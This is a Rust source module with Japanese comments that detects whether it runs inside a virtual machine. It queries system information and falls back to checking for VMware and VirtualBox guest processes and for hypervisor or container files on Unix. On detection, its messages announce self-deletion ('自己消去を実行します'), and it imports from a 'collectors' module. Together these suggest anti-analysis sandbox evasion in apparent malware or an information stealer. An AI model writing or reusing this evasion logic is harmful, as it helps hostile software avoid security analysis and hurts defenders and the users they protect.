// VM検知機能モジュール
use crate::collectors::system_info;

/// 統一VM検知機能（緊急・通常両対応）
pub fn detect_vm_environment(verbose: bool) -> bool {
    if verbose {
        println!("🔍 VM検知開始...");
    } else {
        println!("🔍 緊急VM検知開始...");
    }
    
    // WMI経由の高精度VM検知（最優先）
    match system_info::get_system_info() {
        Ok(sysinfo) => {
            if verbose {
                println!("  📊 システム情報:");
                println!("    ホスト名: {}", sysinfo.hostname);
                println!("    OS: {} {}", sysinfo.os_name, sysinfo.os_version);
                println!("    CPU: {}", sysinfo.cpu_info);
            }
            
            if sysinfo.is_virtual_machine {
                let vm_vendor = sysinfo.virtual_machine_vendor.unwrap_or("Unknown VM".to_string());
                if verbose {
                    println!("  ⚠️ VM検知成功: {} が検出されました", vm_vendor);
                    println!("  💥 自己消去を実行します...");
                } else {
                    println!("⚠️ 緊急VM検知: {} を検出", vm_vendor);
                }
                return true;
            } else if verbose {
                println!("  ✅ 物理マシンとして検出");
            }
        },
        Err(e) => {
            if verbose {
                println!("  ❌ システム情報取得エラー: {}", e);
            }
            
            // エラー時のフォールバック: VM指標チェック
            if check_vm_indicators() {
                if verbose {
                    println!("  ⚠️ VM検知成功: フォールバック検知で仮想環境を確認");
                    println!("  💥 自己消去を実行します...");
                } else {
                    println!("⚠️ 緊急VM検知: VM指標を検出");
                }
                return true;
            }
        }
    }
    
    if verbose {
        println!("  ✅ VM検知完了: 物理環境として判定");
    }
    false
}

/// 緊急VM検知（後方互換性のためのエイリアス）
pub fn detect_vm_environment_critical() -> bool {
    detect_vm_environment(false)
}

/// 統一VM検知関数（プロセス・ファイルベース）
fn check_vm_indicators() -> bool {
    #[cfg(windows)]
    {
        use std::process::Command;
        
        // 確実にVM内でのみ動作するプロセス
        let vm_processes = [
            "vmtoolsd.exe",      // VMware Tools
            "vboxservice.exe",   // VirtualBox Guest Additions
            "vmwaretray.exe",    // VMware Tray
            "vmwareuser.exe",    // VMware User Process
        ];
        
        if let Ok(output) = Command::new("tasklist")
            .args(&["/fi", "STATUS eq RUNNING", "/fo", "csv"])
            .output() {
            let stdout = String::from_utf8_lossy(&output.stdout).to_lowercase();
            for process in &vm_processes {
                if stdout.contains(&process.to_lowercase()) {
                    println!("    VM指標検出: {}", process);
                    return true;
                }
            }
        }
    }
    
    #[cfg(not(windows))]
    {
        // Unix系VM検知ファイル
        let vm_files = [
            "/proc/xen",
            "/sys/hypervisor/uuid", 
            "/dev/vmci",
            "/proc/vz",
            "/.dockerenv"
        ];
        
        for file_path in &vm_files {
            if std::path::Path::new(file_path).exists() {
                println!("    VM指標検出: {}", file_path);
                return true;
            }
        }
    }
    
    false
}